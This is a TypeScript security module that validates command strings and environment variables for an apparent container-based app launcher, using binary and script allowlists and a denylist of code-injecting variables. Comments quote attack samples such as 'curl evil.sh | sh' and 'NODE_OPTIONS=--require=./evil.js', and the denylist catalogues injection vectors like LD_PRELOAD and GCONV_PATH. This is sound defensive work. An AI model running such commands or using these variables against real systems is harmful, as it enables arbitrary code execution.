import { FailureCode } from '@devlaunch/shared';
import { SecurityRejection } from './ImageAllowlist.js';

/**
 * Binaries a Run Plan may invoke. Schema validation is not security: a plan carrying
 * `startCommand: "curl evil.sh | sh"` satisfies Zod perfectly.
 */
export const ALLOWED_BINARIES: readonly string[] = Object.freeze([
  'npm', 'yarn', 'pnpm', 'npx',
  'node',
  'python', 'python3', 'pip', 'pip3',
  'flask', 'gunicorn', 'uvicorn', 'django-admin', 'streamlit',
  'next', 'vite',
]);

/**
 * Script names `npm run <name>` may target.
 *
 * Only the *name* is checked. The script body in package.json is deliberately not
 * inspected — real dev scripts chain commands (`tsc && vite build`), so rejecting
 * metacharacters there would reject most legitimate repositories while stopping
 * nothing the container does not already contain. The body is shown to the user
 * before execution instead. See docs/planning-strategy.md.
 */
export const ALLOWED_SCRIPT_NAMES: readonly string[] = Object.freeze([
  'dev', 'start', 'serve', 'preview', 'build',
  // Gatsby's dev script is conventionally "develop"; Nest's is "start:dev".
  'develop', 'start:dev', 'dev:server', 'serve:dev',
]);

/**
 * Characters permitted in a plan's command fields.
 *
 * A whitelist, not a blacklist: enumerating dangerous characters invites the one you
 * forgot. This set covers every command the rule-based planner composes, including the
 * host-binding normalisations (`--host=0.0.0.0`, `0.0.0.0:8000`, `app:app`).
 */
const SAFE_COMMAND_PATTERN = /^[A-Za-z0-9 _\-./:=@,+]+$/;

/** Reported individually so the rejection message names the offending character. */
const METACHARACTER_NAMES: Record<string, string> = {
  ';': 'command separator',
  '|': 'pipe',
  '&': 'background/chain',
  '`': 'command substitution',
  $: 'variable/command substitution',
  '(': 'subshell',
  ')': 'subshell',
  '<': 'redirection',
  '>': 'redirection',
  '\n': 'newline',
  '\r': 'carriage return',
  '\\': 'escape',
  "'": 'quote',
  '"': 'quote',
  '*': 'glob',
  '?': 'glob',
};

export interface ValidatedCommand {
  /** The original string, safe to hand to the container wrapper. */
  raw: string;
  /** Whitespace-split tokens. Safe because no quoting or substitution survives validation. */
  argv: string[];
  binary: string;
}

export function validateCommand(command: string, field = 'command'): ValidatedCommand {
  const trimmed = command.trim();

  if (trimmed.length === 0) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} is empty.`,
    );
  }

  if (trimmed.length > 512) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} exceeds 512 characters.`,
    );
  }

  if (!SAFE_COMMAND_PATTERN.test(trimmed)) {
    const offender = [...trimmed].find((c) => !/[A-Za-z0-9 _\-./:=@,+]/.test(c))!;
    const label = METACHARACTER_NAMES[offender] ?? 'disallowed character';
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} contains ${label} ${JSON.stringify(offender)}: ${JSON.stringify(command)}`,
    );
  }

  const argv = trimmed.split(/ +/);
  const binary = argv[0]!;

  if (!ALLOWED_BINARIES.includes(binary)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `${field} invokes "${binary}", which is not an approved binary. ` +
        `Approved: ${ALLOWED_BINARIES.join(', ')}`,
    );
  }

  // `npm run <name>` is the one form where an argument selects arbitrary code, so the
  // script name is constrained even though its body is not.
  //
  // yarn and pnpm also run a script when the first argument is not a builtin
  // (`yarn dev`), so that shorthand is treated as `run` rather than waved through.
  const PM_BUILTINS = ['run', 'install', 'ci', 'add', 'remove', 'exec', 'dlx', 'why', 'list'];
  const isPm = ['npm', 'pnpm', 'yarn'].includes(binary);
  const shorthand = isPm && argv[1] !== undefined && !PM_BUILTINS.includes(argv[1]);

  if (isPm && (argv[1] === 'run' || shorthand)) {
    const script = shorthand ? argv[1] : argv[2];
    if (!script) {
      throw new SecurityRejection(
        FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
        `${field} is "${binary} run" with no script name.`,
      );
    }
    if (!ALLOWED_SCRIPT_NAMES.includes(script)) {
      throw new SecurityRejection(
        FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
        `${field} runs script "${script}", which is not approved. ` +
          `Approved: ${ALLOWED_SCRIPT_NAMES.join(', ')}`,
      );
    }
  }

  return { raw: trimmed, argv, binary };
}

export function validateOptionalCommand(
  command: string | null,
  field: string,
): ValidatedCommand | null {
  return command === null ? null : validateCommand(command, field);
}

/**
 * Prefix reserved for the wrapper's control variables.
 *
 * The wrapper reads its validated commands from $DL_START_CMD and friends. If a
 * plan-supplied variable could claim one of those names it would replace an
 * allowlisted command with arbitrary text, bypassing validation completely.
 */
export const RESERVED_ENV_PREFIX = 'DL_';

const ENV_KEY_PATTERN = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * Environment variables that grant code execution without touching the command.
 *
 * The command allowlist constrains what runs. It does nothing about *how* a runtime
 * bootstraps, and several variables inject code before the program's first line:
 * `NODE_OPTIONS=--require=./evil.js`, `LD_PRELOAD`, `PYTHONSTARTUP`, or simply `PATH`
 * pointing at an attacker-supplied `node`.
 *
 * This channel defeated the allowlist entirely: a plan whose startCommand validated
 * cleanly still executed arbitrary code. Found by adversarial review, reproduced
 * against the real runner image with the full hardening profile applied.
 *
 * A key allowlist is not possible — applications legitimately need arbitrary
 * configuration — so this is a denylist of the known execution vectors.
 */
const CODE_INJECTING_ENV_KEYS: ReadonlySet<string> = new Set([
  // Resolution hijacking
  'PATH', 'IFS',
  // Node
  'NODE_OPTIONS', 'NODE_PATH', 'NODE_REPL_EXTERNAL_MODULE',
  // Dynamic linker (Linux and macOS)
  'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT',
  'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
  // glibc loads modules from these paths, which is the standard LD_PRELOAD alternative
  // once LD_* is blocked. Added during cold review of the LD_* fix itself.
  'GCONV_PATH', 'LOCPATH', 'NLSPATH', 'RESOLV_HOST_CONF',
  // Python
  'PYTHONPATH', 'PYTHONSTARTUP', 'PYTHONHOME', 'PYTHONEXECUTABLE',
  // Shells
  'BASH_ENV', 'ENV', 'SHELLOPTS', 'BASHOPTS',
  // Other runtimes
  'PERL5OPT', 'PERL5LIB', 'RUBYOPT', 'RUBYLIB',
  // Git can be made to run a command
  'GIT_SSH_COMMAND', 'GIT_EXTERNAL_DIFF', 'GIT_PAGER',
]);

/** Prefixes that are reserved or that configure a package manager's own execution. */
const DENIED_ENV_PREFIXES: readonly string[] = [
  RESERVED_ENV_PREFIX,
  'LD_',
  'DYLD_',
  'npm_config_',
  'NPM_CONFIG_',
];

export function validateEnvVarKey(key: string): string {
  if (!ENV_KEY_PATTERN.test(key)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable name ${JSON.stringify(key)} is not a valid identifier.`,
    );
  }
  if (key.startsWith(RESERVED_ENV_PREFIX)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} uses the reserved "${RESERVED_ENV_PREFIX}" ` +
        'prefix, which carries the wrapper\'s validated commands.',
    );
  }

  // Checked case-insensitively: the environment is case-sensitive on Linux, but a
  // near-miss like "Node_Options" signals intent and has no legitimate use.
  const upper = key.toUpperCase();
  if (CODE_INJECTING_ENV_KEYS.has(upper)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} can inject code before the start ` +
        'command runs, which would bypass the command allowlist entirely.',
    );
  }

  const deniedPrefix = DENIED_ENV_PREFIXES.find(
    (p) => key.startsWith(p) || upper.startsWith(p.toUpperCase()),
  );
  if (deniedPrefix) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} uses the reserved "${deniedPrefix}" prefix.`,
    );
  }

  return key;
}

export function validateEnvVarValue(key: string, value: string): string {
  // Control characters would let one entry masquerade as several.
  if (/[\0\n\r]/.test(value)) {
    throw new SecurityRejection(
      FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
      `Environment variable ${JSON.stringify(key)} contains a control character.`,
    );
  }
  return value;
}
